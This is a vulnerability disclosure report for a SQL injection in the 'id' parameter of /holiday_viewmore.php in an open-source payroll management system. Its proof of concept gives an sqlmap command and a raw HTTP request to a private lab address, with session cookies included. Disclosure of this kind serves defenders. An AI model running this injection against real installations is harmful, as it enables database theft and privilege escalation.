[description]
 
Online-Payroll-Management-System was discovered to contain a SQL Injection vulnerability via the URI /holiday_viewmore.php with parameter name 'id'.

 ------------------------------------------

 [Vulnerability Type]
 
 SQL Injection

 ------------------------------------------
 [Vendor of Product]
 
 Online-Payroll-Management-System,https://github.com/MD-MAFUJUL-HASAN/Online-Payroll-Management-System

 ------------------------------------------

 [Affected Product Code Base]
 
 <=commit a8902bf64575e325f6d6bf93a55f7bd273ec58cd

 ------------------------------------------

 [Impact Escalation of Privileges]
 
 true

 ------------------------------------------
 [POC]
<img width="820" alt="图片" src="https://github.com/user-attachments/assets/f0016040-8c7e-49b4-a3f6-c3691ac2c6ce">
<img width="694" alt="图片" src="https://github.com/user-attachments/assets/2dd23138-34cd-470e-9ac1-13bfc39c7e98">






sqlmap:
```
sqlmap -r a.txt -p id --batch --banner --flush-session

```
a.txt
```
GET /holiday_viewmore.php?id=13 HTTP/1.1
Host: 192.168.0.183:11182
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.0.183:11182/holiday_view.php
Accept-Encoding: gzip, deflate, br
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8,en-US;q=0.7
Cookie: i18next=en; Admin-Token=eyJhbGciOiJIUzUxMiJ9.eyJsb2dpbl91c2VyX2tleSI6ImU0ZjJhZWJmLWVkMDEtNGM0OC04YjU4LTI3OTFjMzllMzFmMCJ9.0J-cqM7f9-cNNDe8_Q3CAiWkq4iyNqLDbBUh6mnYfRl1Ygv4HPIp3Ky1cbbpN3_4Zr8lYluJ5-nEunFvF84Xyw; sidebarStatus=0; pro_end=-1; ltd_end=-1; serverType=nginx; order=id%20desc; memSize=32012; SESSIONID=5253906e-713a-40e1-9da8-379c12b5fc68.g9MHRcbVBSSnuxBS2kXozqhXoig; request_token=R2jSjrmCm9VN6xmDbAK0n3uK282rC2acIB330unM9N1GRSTD; sites_path=/www/wwwroot; distribution=ubuntu; force=0; load_type=null; uploadSize=1073741824; rank=a; form_proxy=%5Bobject%20Object%5D; backup_path=/www/backup; PHPSESSID=72uq71htklndamdj2mrmj2f9o7; pnull=1; load_page=1; load_search=undefined; vcodesum=13; BatchPaste=null; _ga=GA1.1.2111016145.1721287966; _gid=GA1.1.1011972672.1721287966; Path=/www/wwwroot/Online-Payroll-Management-System.com; _gat=1; _ga_J1DQF09WZC=GS1.1.1721287966.1.1.1721291809.0.0.0
Connection: keep-alive
```
